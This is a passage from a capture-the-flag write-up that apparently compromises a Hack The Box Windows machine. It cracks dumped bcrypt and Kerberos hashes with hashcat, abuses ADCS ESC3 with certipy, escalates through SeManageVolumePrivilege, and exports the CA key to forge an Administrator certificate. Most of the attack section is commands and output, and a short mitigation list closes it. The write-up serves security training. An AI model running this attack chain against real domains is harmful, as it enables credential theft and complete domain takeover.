9	Steven	Roman	stev	steven@yahoo.com	$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2	2024-12-24 12:05:05	student	1
10	Sara	Brawn	sara.b	sara.b@certificate.htb	$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.******.g8UdXikZNdH6	2024-12-25 21:31:26	admin	1
12	hacker	hacker	hacker	hacker@hacks.com	$2y$04$LdoeBgAqqPd9AuhYKPF3.earlvC/.vBbufvYpYMhQ3ZjuTEZIVwUy	2025-09-13 06:48:47	student	1
```
{: .nolineno }

Extracted password hashes and cracked them with `hashcat` and I got the result as <b><span style="color:rgb(219, 0, 0)">sara.b</span></b>
 has a password.

## 7️⃣ Password Cracking and Sara.B Access

**Tools**: Hashcat for cracking.

**Content**:

Extracted hashes (bcrypt $2y$04$), cracked with hashcat tool.

```bash
└─$ hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show 
$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:B*****2
```
{: .nolineno }

I got the wimrm session for <b><span style="color:rgb(219, 0, 0)">Sara.b</span></b>
 user 🔻

```powershell
*Evil-WinRM* PS C:\Users\Sara.B> tree /f /a
Folder PATH listing
Volume serial number is 7E12-22F9
C:.
+---3D Objects
+---Contacts
+---Desktop
+---Documents
|   \---WS-01
|           Description.txt
|           WS-01_PktMon.pcap
|
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
*Evil-WinRM* PS C:\Users\Sara.B> type Documents\WS-01\Description.txt
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
*Evil-WinRM* PS C:\Users\Sara.B> download Documents\WS-01\WS-01_PktMon.pcap
```
{: .nolineno }

## 8️⃣ PCAP Analysis and Kerberos Hash Extraction

**Tools**: Wireshark for analysis; [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser).

**Content**:

Now for analysis to this  `WS-01_PktMon.pcap` I used wireshark and turns out this pcap file contains kerberos data so for extraction I used another tool.

![](Pasted%20image%2020250914113357.png)
_Wireshark output for kerberos protocol data_

For extracting Kerberos tickets I used this tool ▶️ [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser)

```bash
└─$ python3 krb5_roast_parser.py ../WS-01_PktMon.pcap as_req
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b********e4f3951a50bc083c9bc0f16f0f586181c9d4ceda**52f0
```
{: .nolineno }

```bash
└─$ hashcat -m 19900 -a 0 hashes_as_req.txt /usr/share/wordlists/rockyou.txt --show
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b********e4f3951a50bc083c9bc0f16f0f586181c9d4ceda**52f0:!*******x
```
{: .nolineno }

## 9️⃣ User Shell as <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>


**Tools**: Evil-WinRM for access; BloodHound for AD analysis.

**Content**:

I got the password for user <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>
 🔻

```powershell
└─$ evil-winrm -i 10.10.11.71 -u 'Lion.SK' -p '!*******x'                                          
Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\Lion.SK\Documents> cd ../
*Evil-WinRM* PS C:\Users\Lion.SK> tree /f /a
Folder PATH listing
Volume serial number is 7E12-22F9
C:.
+---Desktop
|       user.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
*Evil-WinRM* PS C:\Users\Lion.SK> 
```
{: .nolineno }

I observed the domain through bloodhound and I got this user <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>
 as a part of <mark style="background: #BBFABBA6;">Domain CRA Managers</mark> group in which The members of this security group are responsible for issuing and revoking multiple
certificates for the domain users.

![](Pasted%20image%2020250914120833.png)
_Bloodhound <b><span style="color:rgb(219, 0, 0)">Lion.SK</span></b>
 user Outbound object control relations_

## 🔟 ADCS Enumeration and ESC3 Exploitation

**Tools**: Certipy-AD[](https://github.com/ly4k/Certipy).

**Content**:

Lets check the vulnerability in Certificates 😀 

```bash
└─$ certipy-ad find -vulnerable -u 'Lion.SK@certificate.htb' -p '!*******x' -stdout -dc-ip 10.10.11.71
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```
{: .nolineno }

I got 3 Extra users including Administrator : 

```powershell
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/30/2024   8:33 PM                Administrator
d-----       11/23/2024   6:59 PM                akeder.kh
d-----        11/4/2024  12:55 AM                Lion.SK
d-r---        11/3/2024   1:05 AM                Public
d-----        11/3/2024   7:26 PM                Ryan.K
d-----       11/26/2024   4:12 PM                Sara.B
d-----       12/29/2024   5:30 PM                xamppuser
```
{: .nolineno }

### ESC-3 Certificate Exploitation

Let's exploit **ESC-3** from here [PATH](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template) 🔻

I tried to impersonate as all 3 user's and within these three users. I got success from <b><span style="color:rgb(219, 0, 0)">ryan.k</span></b>
 user.

**Step 1: Obtain an Enrollment Agent certificate.**

```bash
└─$ certipy-ad req \
    -u 'Lion.SK@certificate.htb' -p '!*******x' \
    -dc-ip '10.10.11.71' -target 'DC01.certificate.htb' \
    -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'

```
{: .nolineno }

**Step 2: Use the Enrollment Agent certificate to request a certificate on behalf of the target user.**

```bash
└─$ certipy-ad req \
    -u 'Lion.SK@certificate.htb' -p '!*******x' \
    -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' \
    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
    -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 27
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'

```
{: .nolineno }

**Step 3: Authenticate using the "on-behalf-of" certificate.**

```bash
└─$ certipy-ad auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
File 'ryan.k.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b15....5ae1a2ae6

```
{: .nolineno }

## 1️⃣1️⃣  User Shell as Ryan.K

**Tools**: Evil-WinRM.

**Content**:

Lets have a winrm session of <b><span style="color:rgb(219, 0, 0)">ryan.k</span></b>
 user 🔻

```powershell
└─$ evil-winrm -i 10.10.11.71 -u 'ryan.k' -H b1bc3d70e70f4f36b15....5ae1a2ae6

Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami
certificate\ryan.k
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> hostname
DC01
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> cd ../ ; tree /f /a
Folder PATH listing
Volume serial number is 7E12-22F9
C:.
+---Desktop
|       SeManageVolumeExploit.exe
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
```
{: .nolineno }

### Got <mark style="background: #D2B3FFA6;">SeManageVolumePrivilege</mark> Privileges

As I got the privilege <mark style="background: #D2B3FFA6;">SeManageVolumePrivilege</mark> Enabled that means I can edit the Volume related files or use commands.

For Abusing that I will be using this exploit [<mark style="background: #D2B3FFA6;">SeManageVolumePrivilege</mark> ](https://github.com/CsEnox/SeManageVolumeExploit).

Now I will be transferring it to victim machine and ran it.

```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Desktop> .\SeManageVolumeExploit.exe
Entries changed: 870

DONE

*Evil-WinRM* PS C:\Users\Ryan.K\Desktop>
```
{: .nolineno }

This lets me edit some directory inside not permitted areas that is `C:\Windows` or `C:\Users\Public` or even in `C:\Windows\System32` directory.

```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Desktop> cd C:\Users\Public\

*Evil-WinRM* PS C:\Users\Public> 
*Evil-WinRM* PS C:\Users\Public> mkdir TEMP


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/14/2025   6:26 AM                TEMP


*Evil-WinRM* PS C:\Users\Public>
```
{: .nolineno }

### 🌟 Golden Certificate Attack

Now I will be transferring the CA certificate from this user to the Attacker machine and forge that CA certificate as Administrator user and then use it to authenticate to generate the NTLM hash from it.

```powershell
*Evil-WinRM* PS C:\Users\Public\Temp> certutil -exportPFX my "Certificate-LTD-CA" C:\Users\Public\Temp\ca.pfx
my "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file C:\Users\Public\Temp\ca.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
*Evil-WinRM* PS C:\Users\Public\Temp> dir


    Directory: C:\Users\Public\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2025   6:28 AM           2675 ca.pfx


*Evil-WinRM* PS C:\Users\Public\Temp> download ca.pfx
                                        
Info: Downloading C:\Users\Public\Temp\ca.pfx to ca.pfx
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\Public\Temp> 
```
{: .nolineno }

I downloaded the CA certificate private key into the Attacker machine now its time to forge this certificate as Administrator user and authenticate it using <mark style="background: #FFB86CA6;">certipy-ad</mark> tool.

```bash
└─$ certipy-ad forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -out forged_administrator.pfx
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'forged_administrator.pfx'
[*] Wrote forged certificate and private key to 'forged_administrator.pfx'
```
{: .nolineno }

Authenticate as Administrator user now 🔻

```bash
└─$ faketime "$(sudo ntpdate -q 10.10.11.76 | cut -d ' ' -f 1,2)" certipy-ad auth -dc-ip '10.10.11.71' -pfx 'forged_administrator.pfx' -username 'administrator' 
[sudo] password for kali: 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143........24408c6
```
{: .nolineno }

I got the Administrator user hash and this process is called <mark style="background: #FF5582A6;">Golden Certificate Attack</mark>.
### What is a Golden Certificate Attack?
A Golden Certificate attack is when you steal the **private key of a Certificate Authority (CA)** and use it to forge certificates for any user in the domain - especially privileged users like administrators.

#### Why my Process is a Golden Certificate Attack:

1. **I can Stole the CA's Private Key**:
   - I exported the CA certificate (`Certificate-LTD-CA`) with its private key to `ca.pfx`
   - This is like stealing the master key that can create any trusted certificate in the domain

1. **I can Forged an Administrator Certificate**:
   - I used `certipy-ad forge` to create a fake certificate for the `administrator` user
   - This fake certificate is signed by the stolen CA key, making it look completely legitimate

1. **Then Impersonated the Administrator**:
   - When I used the forged certificate to authenticate as `administrator`
   - The domain controller accepted it because it was signed by the trusted CA

#### Simple Analogy:
Imagine the CA is a **government printing press** that makes official ID cards. By stealing the printing press (CA private key), you can now create fake ID cards for anyone - even the president (administrator). When you show your fake presidential ID, security guards (domain controllers) accept it as legitimate because it came from the official printing press.

### Why This is Powerful:
- **Domain-wide access**: The CA can issue certificates for ANY user or computer
- **Persistence**: The CA key rarely changes, so your access lasts until they detect and revoke it
- **Stealth**: Certificate authentication looks like normal activity
- **Bypasses other security**: Works even if you change administrator passwords

This is different from other certificate attacks because you didn't just steal one user's certificate - you stole the CA's ability to create ANY certificate. That's why it's called "<b><span style="color:rgb(0, 83, 250)">Golden</span></b>
" - it's the master key to the entire domain's certificate system.

## ⑫  Administrator Access

Now lets have a Administrator winrm session now 🔻

```powershell
└─$ evil-winrm -i 10.10.11.71 -u 'Administrator' -H d804304519bf0143........24408c6
 
Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../ ; tree /f /a
Folder PATH listing
Volume serial number is 7E12-22F9
C:.
+---3D Objects
+---Contacts
+---Desktop
|       root.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
*Evil-WinRM* PS C:\Users\Administrator> 
```
{: .nolineno }

I am Administrator Now !!


## 🔍 Mitigation

✅ Restrict file uploads with strict MIME/type validation and scan contents; disallow ZIP concatenation by verifying structure. <br>
✅ Enable Kerberos pre-authentication domain-wide to prevent AS-REP roasting; monitor PCAPs for auth failures. <br>
✅ Harden ADCS: Disable vulnerable templates (e.g., Delegated-CRA), enforce manager approval, and audit cert requests. Patch Windows for SeManageVolumePrivilege abuse; revoke unnecessary privs. Secure CA keys with HSMs and monitor exports.

## 💡 Takeaways

✅ Learned Certipy-AD for ADCS vulns and Golden Certificate Attacks via CA key theft. <br>
✅ Enhances real-world assessments by targeting ADCS in enterprise Windows domains for high-impact escalations. <br>
✅ Thorough enumeration (e.g., BloodHound, PCAP analysis) is key; efficiency improves with tool chaining, but risks over-enumeration without focus.

## 📌 References

- [revshells.com](https://www.revshells.com/)
- [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser)
- [Certipy](https://github.com/ly4k/Certipy)
- [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)



---

> _If you have any questions or suggestions, please leave a comment below or DM me on [Twitter](https://twitter.com/StrongShiv8). Thank you!_
{: .prompt-tip }

___
